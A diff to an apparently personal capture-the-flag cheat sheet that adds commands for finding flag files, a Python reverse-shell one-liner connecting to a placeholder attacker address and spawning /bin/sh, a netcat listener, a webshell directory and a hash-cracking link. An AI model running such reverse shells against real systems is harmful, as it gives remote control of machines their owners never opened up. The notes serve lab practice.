@@ -40,8 +40,14 @@ steghide extract -sf <PictureName>
 ```sh
 ps aux
 ```
-
-
+- #### Finding belongings of `user` group
+```ls
+find / -group users -type f 2>/dev/null
+```
+- #### Finding a File
+```sh
+find / -type f -name user.txt 2> /dev/null
+```
 
 ### FTP Commands
 - #### Downloding from  `ftp` to `local`
@@ -93,7 +99,10 @@ retr <list number>
 
 ## Scripts
 
-
+- #### Python Reverse shell `One-Liner`
+```py
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<machine_Ip-openvpn>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
 ## PrivEsc
 
 - #### **Finding info in the crontab**
@@ -105,8 +114,15 @@ cat /etc/crontab
 ```sh
 ls -la /etc/cron.daily/
 ```
-
-
+## Reverse Shell
+- Starting listener
+```sh
+nc -nlvp <port_number>
+```
+### PHP reverse-shell
+```ls
+/usr/share/webshell/
+```
 ## Links 
 
 - #### **Audio Decoder**
@@ -119,6 +135,8 @@ ls -la /etc/cron.daily/
     - [GTFOBINS](https://gtfobins.github.io/)
     - [PentestMonkey](https://github.com/pentestmonkey)
 
+- #### HashDecoder
+    - [hash killer](https://hashkiller.io/listmanager)
 
 
 ## Brute Forcing
